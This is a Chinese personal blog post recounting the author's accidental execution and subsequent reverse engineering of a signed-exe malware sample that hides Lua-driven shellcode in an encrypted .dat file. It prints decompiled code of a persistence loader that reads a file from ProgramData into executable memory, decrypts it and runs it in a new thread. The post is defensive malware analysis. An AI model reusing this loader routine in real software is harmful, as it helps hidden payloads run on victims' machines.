---
layout: post
title: "记一次给自己应急"
date: 2024-04-12 18:19:58 +0800
categories: reverse-engineering
---

很久没分析样本了，这次朋友发了个样本过来我看很有意思就想分析一下。但是终究是太自信，也是嫌麻烦，都没有把样本扔虚拟机分析，本机打开 ida 就开始逆向了。然后不出意外的我就手抖不小心把样本跑了起来，于是就有了这篇文章。

样本是一个带签名的 exe，附带了一个 `.dat` 文件，这是最开始吸引我的地方。因为众所周知，一般白加黑都是一个签名 exe 带个黑 dll，而这样本只有个 dat 文件，所以肯定有点意思。经过一通逆向后在样本里找到了很多 lua 相关的字符串，我大概猜到这个白加黑是靠 lua 脚本实现的白加黑了。网上搜了一下这个样本的信息同样确认了这个样本是从 dat 文件提取 lua 脚本执行的，作者会在 lua 脚本中插入执行shellcode 的代码，而这个 dat 文件是一个加密的压缩包。

知道了大概流程就简单了，直接在相关内存加载相关代码下断 dump 下来 shellcode 做分析。从 dump 出的 shellcode 中翻了一下找到了 mz 头，那么估计就是个内存加载 pe 的代码了：

![](/assets/images/Pasted_image_20240412173558.png)

不过为了安全起见我还是用调试器跟了一遍，确定就是内存加载的代码，然后直接提取出来被内存加载的 pe 分析

```
HANDLE sub_10001120()
{
  HANDLE result; // eax
  HANDLE v1; // eax
  DWORD (__stdcall *lpStartAddress)(LPVOID); // [esp+Ch] [ebp-224h]
  WCHAR String1[262]; // [esp+10h] [ebp-220h] BYREF
  LPVOID lpBuffer; // [esp+21Ch] [ebp-14h]
  DWORD NumberOfBytesRead; // [esp+220h] [ebp-10h] BYREF
  HANDLE hFile; // [esp+224h] [ebp-Ch]
  BOOL v7; // [esp+228h] [ebp-8h]
  SIZE_T dwSize; // [esp+22Ch] [ebp-4h]

  lstrcpyW(String1, L"C:\\ProgramData\\templateWatch.dat");
  result = CreateFileW(String1, 0x80000000, 0, 0, 3u, 0x80u, 0);
  hFile = result;
  if ( result )
  {
    dwSize = GetFileSize(hFile, 0);
    if ( dwSize >= 0x200 && (lpBuffer = VirtualAlloc(0, dwSize, 0x3000u, 0x40u)) != 0 )
    {
      NumberOfBytesRead = 0;
      v7 = ReadFile(hFile, lpBuffer, dwSize, &NumberOfBytesRead, 0);
      if ( hFile )
      {
        CloseHandle(hFile);
        hFile = 0;
      }
      if ( v7 )
      {
        if ( NumberOfBytesRead == dwSize )
        {
          lpStartAddress = (DWORD (__stdcall *)(LPVOID))((char *)lpBuffer + 256);
          if ( sub_10001020((BYTE *)lpBuffer + 256, dwSize - 256, (BYTE *)lpBuffer, 0x100u) )
          {
            CreateThread(0, 0, lpStartAddress, 0, 0, 0);
            v1 = GetCurrentProcess();
            WaitForSingleObject(v1, 0xFFFFFFFF);
          }
        }
      }
      if ( hFile )
        CloseHandle(hFile);
      result = (HANDLE)VirtualFree(lpBuffer, 0, 0x8000u);
    }
    else
    {
      result = (HANDLE)CloseHandle(hFile);
    }
  }
  return result;
}
```

一览无余的从文件读取 shellcode 然后再加载，然后检查了下本人电脑的这个路径，发现并没有这个文件，safe 了。再问了下朋友确认这个只是整个样本的一部分，应该只是用来维持权限的，安装后门的代码在另外的位置，虚惊一场！

---

我是太想搞安全了，但是没时间，而且区块链这边搞的也不是很顺利。不过看来二进制这块我还没有太生疏，逆完这样本说实话还挺开心的，感觉自己宝刀未老啊。
